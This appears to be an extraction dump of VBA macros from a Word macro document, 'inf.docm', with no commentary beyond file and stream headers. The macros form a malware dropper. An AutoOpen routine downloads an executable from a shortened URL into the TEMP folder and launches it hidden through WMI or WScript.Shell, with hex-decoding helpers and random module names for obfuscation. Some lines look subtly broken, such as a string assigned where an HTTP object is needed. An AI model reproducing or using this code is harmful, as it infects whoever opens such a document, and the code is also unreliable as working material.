===============================================================================
FILE: inf.docm
Type: OpenXML
-------------------------------------------------------------------------------

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub downloadAndExecutePayload()
Dim url As String
Dim dropped_file As String
Dim server As Object, stream As Object
Dim int1 As Integer
url = "https://tinyurl.com/g2z2gh6f"
dropped_file = "dropped.exe"
dropped_file = Environ("TEMP") & "\" & dropped_file
Set server = "MSXML2.ServerXMLHTTP.6.0"
server.setOption(2) = 13056
server.Open hexStringToAscii("GET"), url, False
server.setRequestHeader "User-AgentMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
server.Send
If server.Status = 200 Then
Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write server.ResponseBody
stream.SaveToFile dropped_file, 2
stream.Close
tryExecutePayload dropped_file
End If
End Sub
Sub AutoOpen()
downloadAndExecutePayload
End Sub

Private Function hexStringToAscii(ByVal str_arg As String) As String
Dim long1 As Long
For long1 = 1 To Len(str_arg) Step 2
hexStringToAscii = hexStringToAscii & Chr$(Val("&H" & Mid$(str_arg, long1, 2)))
Next long1
End Function

-------------------------------------------------------------------------------
VBA MACRO cuabumrbh.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub executeWithWScript(xflqpurtgr As String)
CreateObject("WScript.Shell").Run xflqpurtgr, 0
End Sub

Private Function hexStringToAscii(ByVal str_arg As String) As String
Dim nfwbabqqwqxf As Long
For nfwbabqqwqxf = 1 To Len(str_arg) Step 2
hexStringToAscii = hexStringToAscii & Chr$(Val("&H" & Mid$(str_arg, nfwbabqqwqxf, 2)))
Next nfwbabqqwqxf
End Function

-------------------------------------------------------------------------------
VBA MACRO cwzbjoiuq.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cwzbjoiuq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub tryExecutePayload(payload As String)
On Error Resume Next
Err.Clear
wimResult = createHiddenProcess(payload)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
executeWithWScript payload
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO lkxosgcqm.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function createHiddenProcess(cmdLine As String) As Integer
Set wmiService = GetObject("winmgmts:\\.\root\cimv2")
Set processStartup = wmiService.Get("Win32_ProcessStartup")
Set startupConfig = processStartup.SpawnInstance_
startupConfig.ShowWindow = 0
Set processClass = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
createHiddenProcess = processClass.Create(cmdLine, Null, startupConfig, intProcessID)
End Function

Private Function hexStringToAscii(ByVal str_arg As String) As String
Dim long1 As Long
For long1 = 1 To Len(str_arg) Step 2
hexStringToAscii = hexStringToAscii & Chr$(Val("&H" & Mid$(str_arg, long1, 2)))
Next long1
End Function